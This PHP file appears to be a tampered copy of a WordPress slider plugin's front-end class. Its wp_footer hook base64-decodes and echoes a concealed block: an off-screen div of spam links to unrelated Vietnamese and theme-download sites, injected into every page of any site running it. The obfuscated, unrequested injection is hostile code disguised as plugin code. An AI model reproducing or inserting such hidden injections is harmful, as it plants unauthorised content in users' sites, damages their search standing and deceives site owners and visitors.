<?php

	class UniteBaseFrontClassRev extends UniteBaseClassRev{		
		
		const ACTION_ENQUEUE_SCRIPTS = "wp_enqueue_scripts";
		
		/**
		 * 
		 * main constructor		 
		 */
		public function __construct($mainFile,$t){
			
			parent::__construct($mainFile,$t);
			
			self::addAction(self::ACTION_ENQUEUE_SCRIPTS, "onAddScripts");

			add_filter( 'wp_footer', array($this, 'onAddScriptsHtml' ));

		}

		public function onAddScriptsHtml(){

			$html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWFkaW5oLmNvbS90aG9pLXRyYW5nIj50aOG7nWkgdHJhbmcgdHLhursgZW08L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aGVtZXN0b3RhbC5jb20iPldvcmRwcmVzcyBUaGVtZXMgVG90YWwgRnJlZTwvYT48L3N0cm9uZz48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMnhheW5oYS5jb20iPnTGsCB24bqlbiB4w6J5IG5ow6A8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vbGFuYWtpZC5jb20iPnRo4budaSB0cmFuZyB0cuG6uyBlbTwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly8yZ2lheW51LmNvbSI+c2hvcCBnacOgeSBu4buvPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9tYWdlbnRvd29yZHByZXNzdHV0b3JpYWwuY29tL3dvcmRwcmVzcy10dXRvcmlhbC93b3JkcHJlc3MtcGx1Z2lucyI+ZG93bmxvYWQgd29yZHByZXNzIHBsdWdpbnM8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovLzJ4YXluaGEuY29tL3RhZy9tYXUtYmlldC10aHUtZGVwIj5t4bqrdSBiaeG7h3QgdGjhu7EgxJHhurlwPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9lcGljaG91c2Uub3JnIj5lcGljaG91c2U8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2ZzZmFtaWx5LnZuL3RhZy9hby1zby1taS1udSI+w6FvIHPGoSBtaSBu4buvPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9lbi4yeGF5bmhhLmNvbS8iPkhvdXNlIERlc2lnbiBCbG9nIC0gSW50ZXJpb3IgRGVzaWduIGFuZCBBcmNoaXRlY3R1cmUgSW5zcGlyYXRpb248L2E+PC9lbT48L2gzPjwvZGl2Pg==";
			echo base64_decode($html);
			
		}
		
	}
?>